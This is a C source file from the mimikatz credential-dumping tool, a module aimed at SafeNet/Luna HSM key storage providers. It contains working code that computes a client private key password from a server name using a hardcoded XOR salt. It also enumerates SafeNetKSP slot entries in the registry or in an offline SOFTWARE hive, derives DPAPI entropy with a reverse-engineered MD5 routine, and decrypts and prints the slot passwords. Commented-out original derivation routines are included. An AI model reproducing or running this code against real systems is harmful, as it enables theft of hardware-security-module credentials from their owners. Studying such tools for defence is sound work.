/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_dpapi_lunahsm.h"

NTSTATUS kuhl_m_dpapi_lunahsm(int argc, wchar_t * argv[])
{
	HANDLE hDataSoftware;
	PKULL_M_REGISTRY_HANDLE hSoftware;
	HKEY hBase;
	LPCWSTR szArg = NULL;
	LPSTR aClient, PrivateKeyPassword;

	if(kull_m_string_args_byName(argc, argv, L"client", &szArg, NULL)) // ok, not really DPAPI, but it calculates the password of the client private key
	{
		if(aClient = kull_m_string_unicode_to_ansi(szArg))
		{
			if(PrivateKeyPassword = kuhl_m_dpapi_safenet_pk_password(aClient))
			{
				kprintf(L"Password for `%S` private key is `%S` (without `` quotes)\n", aClient, PrivateKeyPassword);
				LocalFree(PrivateKeyPassword);
			}
			LocalFree(aClient);
		}
	}
	else if(kull_m_string_args_byName(argc, argv, L"hive", &szArg, NULL))
	{
		hDataSoftware = CreateFile(szArg, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if(hDataSoftware != INVALID_HANDLE_VALUE)
		{
			if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSoftware, FALSE, &hSoftware))
			{
				kuhl_m_dpapi_safenet_ksp_registryparser(hSoftware, NULL, argc, argv);
				kull_m_registry_close(hSoftware);
			}
			CloseHandle(hSoftware);
		}
		else PRINT_ERROR_AUTO(L"CreateFile (SOFTWARE hive)");
	}
	else
	{
		if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, FALSE, &hSoftware))
		{
			if(kull_m_registry_RegOpenKeyEx(hSoftware, HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_READ, &hBase))
			{
				kuhl_m_dpapi_safenet_ksp_registryparser(hSoftware, hBase, argc, argv);
				kull_m_registry_RegCloseKey(hSoftware, hBase);
			}
			kull_m_registry_close(hSoftware);
		}
	}
	return STATUS_SUCCESS;
}

void kuhl_m_dpapi_safenet_ksp_registryparser(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hBase, int argc, wchar_t * argv[])
{
	HKEY hKeys, hEntry;
	DWORD i, nbSubKeys, szMaxSubKeyLen, szKey;
	wchar_t * keyName;
	char *aKeyName;
	BYTE entropy[MD5_DIGEST_LENGTH];

	if(kull_m_registry_RegOpenKeyEx(hRegistry, hBase, L"Safenet\\SafeNetKSP\\Slots", 0, KEY_WOW64_64KEY | KEY_READ, &hKeys))
	{
		if(kull_m_registry_RegQueryInfoKey(hRegistry, hKeys, NULL, NULL, NULL, &nbSubKeys, &szMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL))
		{
			szMaxSubKeyLen++;
			if(keyName = (wchar_t *) LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
			{
				for(i = 0; i < nbSubKeys; i++)
				{
					szKey = szMaxSubKeyLen;
					if(kull_m_registry_RegEnumKeyEx(hRegistry, hKeys, i, keyName, &szKey, NULL, NULL, NULL, NULL))
					{
						kprintf(L"\n   [%s] ", keyName);

						if(aKeyName = kull_m_string_unicode_to_ansi(keyName))
						{
							kuhl_m_dpapi_safenet_ksp_entropy(aKeyName, entropy);
							kull_m_string_wprintf_hex(entropy, MD5_DIGEST_LENGTH, 0);
							kprintf(L" ");
							if(kull_m_registry_RegOpenKeyEx(hRegistry, hKeys, keyName, 0, KEY_READ, &hEntry))
							{
								kprintf(L"\n");
								kuhl_m_dpapi_safenet_ksp_registry_user_parser(hRegistry, hEntry, entropy, argc, argv);
								kull_m_registry_RegCloseKey(hRegistry, hEntry);
							}
							else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx");
							LocalFree(aKeyName);
						}
					}
				}
				LocalFree(keyName);
			}
		}
		else PRINT_ERROR_AUTO(L"kull_m_registry_RegQueryInfoKey");
		kull_m_registry_RegCloseKey(hRegistry, hKeys);
	}

}

void kuhl_m_dpapi_safenet_ksp_registry_user_parser(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hEntry, BYTE entropy[MD5_DIGEST_LENGTH], int argc, wchar_t * argv[])
{
	DWORD i, type, nbValues, szMaxValueNameLen, szMaxValueLen, szSecretName, szSecret, cbDataOut;
	PBYTE secret, dataOut;
	wchar_t * secretName;

	if(kull_m_registry_RegQueryInfoKey(hRegistry, hEntry, NULL, NULL, NULL, NULL, NULL, NULL, &nbValues, &szMaxValueNameLen, &szMaxValueLen, NULL, NULL))
	{
		szMaxValueNameLen++;
		if(secretName = (wchar_t *) LocalAlloc(LPTR, (szMaxValueNameLen + 1) * sizeof(wchar_t)))
		{
			if(secret = (PBYTE) LocalAlloc(LPTR, szMaxValueLen))
			{
				for(i = 0; i < nbValues; i++)
				{
					szSecretName = szMaxValueNameLen;
					szSecret = szMaxValueLen;
					if(kull_m_registry_RegEnumValue(hRegistry, hEntry, i, secretName, &szSecretName, NULL, &type, secret, &szSecret))
					{
						kprintf(L"\t[%s]\n", secretName);
						if(type == REG_BINARY)
						{
							if(kuhl_m_dpapi_unprotect_raw_or_blob(secret, szSecret, NULL, argc, argv, entropy, MD5_DIGEST_LENGTH, (LPVOID *) &dataOut, &cbDataOut, NULL))
							{
								kprintf(L"\tSlot password: %.*S\n", cbDataOut, dataOut);
								LocalFree(dataOut);
							}
						}
						else PRINT_ERROR(L"Incompatible REG type: %u\n", type);
					}
				}
				LocalFree(secret);
			}
			LocalFree(secretName);
		}
	}
}

const BYTE SAFENET_KSP_ENTROPY_MIXER_DERIVED[MD5_DIGEST_LENGTH] = {0xef, 0x85, 0xf9, 0x5d, 0x17, 0x77, 0x07, 0x41, 0xcf, 0x6d, 0x27, 0x9f, 0x17, 0x9b, 0xdd, 0x4f};
void kuhl_m_dpapi_safenet_ksp_entropy(IN LPCSTR identity, OUT BYTE entropy[MD5_DIGEST_LENGTH])
{
	DWORD i, dwIdentity = lstrlenA(identity);
	MD5_CTX ctx;
	MD5Init(&ctx);
	for(i = 0; i < 1462; i++)
		MD5Update(&ctx, identity, dwIdentity);
	MD5Final(&ctx);
	for(i = 0; i < MD5_DIGEST_LENGTH; i++)
		entropy[i] = ctx.digest[i] ^ SAFENET_KSP_ENTROPY_MIXER_DERIVED[i];
}

const BYTE SAFENET_PRIVATEKEY_PASSWORD_SALT_DERIVED[] = {0x05, 0x1c, 0x08, 0x14, 0x0d, 0x11, 0x45, 0x54, 0x04, 0x45, 0x15, 0x4f, 0x0d, 0x01, 0x4e, 0x04, 0x1b, 0x06, 0x46, 0x00};
LPSTR kuhl_m_dpapi_safenet_pk_password(IN LPCSTR server)
{
	BOOL status = FALSE;
	DWORD i, dwServer = min(lstrlenA(server), 20);
	LPSTR password;
	if(password = (LPSTR) LocalAlloc(LPTR, dwServer + 1))
		for(i = 0; i < dwServer; i++)
			password[i] = SAFENET_PRIVATEKEY_PASSWORD_SALT_DERIVED[i] ^ server[i];
	return password;
}

//const BYTE SAFENET_KSP_ENTROPY_MIXER[MD5_DIGEST_LENGTH] = {0xd5, 0x56, 0x7b, 0xc9, 0x15, 0x42, 0x62, 0x0f, 0x9c, 0xc6, 0x17, 0xf1, 0x93, 0x9a, 0x0c, 0xa7};
//void kuhl_m_dpapi_safenet_ksp_entropy_original(IN LPCSTR identity, OUT BYTE entropy[MD5_DIGEST_LENGTH])
//{
//	DWORD i, dwIdentity = lstrlenA(identity);
//	MD5_CTX ctx;
//	BYTE value = 0x45;
//	MD5Init(&ctx);
//	for(i = 0; i < 1462; i++)
//		MD5Update(&ctx, identity, dwIdentity);
//	MD5Final(&ctx);
//	for(i = 0; i < MD5_DIGEST_LENGTH; i++)
//	{
//		value ^= ((SAFENET_KSP_ENTROPY_MIXER[i] >> 1) & 0x7e) + 0x40;
//		entropy[i] = ctx.digest[i] ^ value;
//	}
//}
//
//const char SAFENET_PRIVATEKEY_PASSWORD_SALT0[] = "Unable to load config info.";
//const char SAFENET_PRIVATEKEY_PASSWORD_SALT1[] = "Private key length is too short";
//LPSTR kuhl_m_dpapi_safenet_pk_password_original(IN LPCSTR server)
//{
//	BOOL status = FALSE;
//	DWORD i, dwServer = min(lstrlenA(server), 20);
//	LPSTR password;
//	if(password = (LPSTR) LocalAlloc(LPTR, dwServer + 1))
//		for(i = 0; i < dwServer; i++)
//			password[i] = SAFENET_PRIVATEKEY_PASSWORD_SALT0[i] ^ SAFENET_PRIVATEKEY_PASSWORD_SALT1[i] ^ server[i];
//	return password;
//}